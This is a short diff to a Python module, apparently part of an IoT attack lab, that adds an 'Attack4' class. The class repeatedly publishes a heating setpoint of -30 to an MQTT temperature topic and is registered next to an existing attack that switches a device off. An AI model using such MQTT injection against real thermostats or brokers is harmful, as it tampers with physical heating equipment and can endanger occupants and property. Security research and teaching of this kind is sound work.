@@ -3,7 +3,7 @@ import time
 from abc import ABC, abstractmethod
 from typing import Dict, Any, Tuple
 
-from config import ATTACK2_INTERVAL, MQTT_SET_TOPIC, MQTT_STATE_TOPIC, ATTACK3_INTERVAL
+from config import ATTACK2_INTERVAL, MQTT_SET_TOPIC, MQTT_STATE_TOPIC, ATTACK3_INTERVAL, ATTACK4_INTERVAL, MQTT_SET_TEMP_TOPIC
 from mqtt_service import publish_to_topic
 from utils import add_event
 
@@ -87,6 +87,16 @@ class Attack3(BaseAttack):
         return publish_to_topic(MQTT_STATE_TOPIC, {'state': 'OFF'})
 
 
+class Attack4(BaseAttack):
+    """Ataque 4: Fuerza temperatura a -30 constantemente en el topic de temperatura."""
+
+    def __init__(self):
+        super().__init__('attack4', 'ATAQUE 4 (TEMP -30)', ATTACK4_INTERVAL)
+
+    def execute_attack(self) -> Tuple[bool, str, bool]:
+        return publish_to_topic(MQTT_SET_TEMP_TOPIC, {'current_heating_setpoint': -30})
+
+
 class AttackManager:
     """Gestor centralizado de todos los ataques."""
     
@@ -104,6 +114,7 @@ class AttackManager:
         self._attacks = {
             'attack2': Attack2(),
             'attack3': Attack3(),
+            'attack4': Attack4(),
         }
     
     def register_attack(self, attack: BaseAttack):
